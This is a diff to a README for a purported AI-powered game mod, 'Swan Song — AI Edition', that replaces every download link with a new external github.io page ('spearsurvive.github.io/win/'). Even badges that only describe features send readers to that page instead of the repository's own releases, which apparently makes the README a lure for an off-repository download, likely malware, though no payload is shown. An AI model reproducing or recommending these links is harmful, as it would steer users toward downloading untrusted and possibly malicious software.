@@ -2,9 +2,9 @@
 
 # Swan Song — AI Edition
 
-[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://hydracomptrollercord.github.io/Downloader/)
-[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://hydracomptrollercord.github.io/Downloader/)
-[![Six survivors in a church](https://img.shields.io/badge/Survivors-6%20in%20a%20Church-4a4a5a?style=for-the-badge)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://spearsurvive.github.io/win/)
+[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://spearsurvive.github.io/win/)
+[![Six survivors in a church](https://img.shields.io/badge/Survivors-6%20in%20a%20Church-4a4a5a?style=for-the-badge)](https://spearsurvive.github.io/win/)
 
 [![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/Boulevardfitzstrip/swan-song-ai-edition)
 [![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/Boulevardfitzstrip/swan-song-ai-edition)
@@ -55,7 +55,7 @@ A locally-hosted model runs the group under a resource system: food, warmth, and
 
 ### Step 1 — Get the mod
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://hydracomptrollercord.github.io/Downloader/)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 ### Step 2 — Install Ollama (the local AI engine)
 
@@ -146,7 +146,7 @@ CPU-only inference is supported and slower. No GPU is strictly required.
 
 ## 🔗 Links
 
-- **[⬇ Download the latest version](https://hydracomptrollercord.github.io/Downloader/)**
+- **[⬇ Download the latest version](https://spearsurvive.github.io/win/)**
 - [Repository](https://github.com/Boulevardfitzstrip/swan-song-ai-edition)
 - [Ollama — local AI runtime](https://ollama.com)
 - [Ollama model library](https://ollama.com/library)
